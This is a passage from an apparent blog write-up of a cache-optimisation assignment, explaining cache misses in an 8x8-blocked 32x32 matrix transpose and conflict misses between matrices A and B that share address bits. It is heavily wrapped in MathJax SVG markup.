29</span><br><span class="line"> -------------------</span><br><span class="line">| 20 | 21 | 22 | 23 |  row 30</span><br><span class="line"> -------------------</span><br><span class="line">| 24 | 25 | 26 | 27 |  row 31</span><br><span class="line"> -------------------</span><br><span class="line">| 28 | 29 | 30 | 31 |  row 32</span><br><span class="line"> -------------------</span><br></pre></td></tr></table></figure>
<p>Each block has 8 integers (32 bytes). You can see that this pattern
repeats every 8 rows. So, it we use 8*8 blocking to partition this
matrix, the number of misses will amount to
<code>32*32/(8*8)*8*2=256</code> times (<code>32*32/(8*8)</code>
blockings for a single matrix, each blocking produces 8 misses and two
matrices).</p>
<p>But when adopt 8*8 blocking, the result will be 344 misses! Why is
that? We can guess it's because matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> overwrites some of the caches for
matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>!</p>
<p>To validate our assumption, we can print the addresses of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> and <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. Add
<code>printf("%p %p\n", A, B);</code> in <code>tracegen.c</code> and see
their addresses:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59010cdbb0c0 0x59010cdfb0c0</span><br></pre></td></tr></table></figure>
<p>Note that your result may differ from mine. Recall that in the
problem settings <code>s=b=5</code>. The addresses of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> and <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> have the same lowest 16 bits. This
means matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> has the same cache
layout pattern as matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>. When we
read the first element of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>, the
first block will be loaded; when we read the first element of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>, it overwrites the block just loaded
from <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>!</p>
<p>With that being said, reading <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> and writing it to <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.495ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2871 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(759,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1037,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1537,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1815,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2093,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2593,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> causes two cache misses! The
first is a cold miss which we cannot avoid, but the second is a conflict
miss but it's hard to avoid.</p>
<p>Again, reading <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> and
writing it to <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.495ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2871 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(759,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1037,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1537,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1815,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2093,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2593,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span> also cases
two misses. The first is a conflict miss with the block from <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.495ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2871 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(759,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1037,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1537,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1815,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2093,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(2593,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span>. The second is a cold miss.</p>
<p>We do not want the conflict miss that takes place when reading <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span>. This miss happens when the cache
will be overwritten by the block of <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.475ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2862 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750,0)"><path data-c="5B" d="M118 